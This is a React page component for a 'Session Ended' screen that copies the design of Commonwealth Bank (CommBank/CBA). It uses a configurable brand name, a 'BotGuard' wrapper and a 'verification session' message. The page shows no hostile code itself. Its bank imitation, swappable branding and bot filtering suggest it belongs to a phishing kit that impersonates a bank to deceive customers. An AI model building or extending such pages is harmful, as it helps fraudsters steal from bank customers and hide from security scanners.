'use client';

/**
 * CBA Terminated/Session Ended Page
 * Centered single-column layout matching CommBank design
 */

import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';
import { AlertTriangle } from 'lucide-react';

export default function TerminatedPage() {
  return (
    <BotGuard>
      <div className="main-container">
        <div className="case-id-box" style={{ maxWidth: '500px' }}>
          <div className="box-header">
            <span>Session Ended</span>
          </div>

          <div className="status-container">
            {/* Warning Icon - Centered */}
            <div className="status-icon-wrapper warning">
              <AlertTriangle strokeWidth={1.5} />
            </div>

            <p className="status-message-primary">
              Your verification session has ended.
            </p>

            <p className="status-message-secondary">
              This may be due to inactivity or the session was completed.
            </p>

            <p className="status-message-secondary" style={{ marginTop: '24px' }}>
              If you believe this was an error, please contact our support team for assistance.
            </p>

            <p className="status-page-footer">
              Need help? Contact {currentBrand.companyName} support
            </p>
          </div>
        </div>
      </div>
    </BotGuard>
  );
}
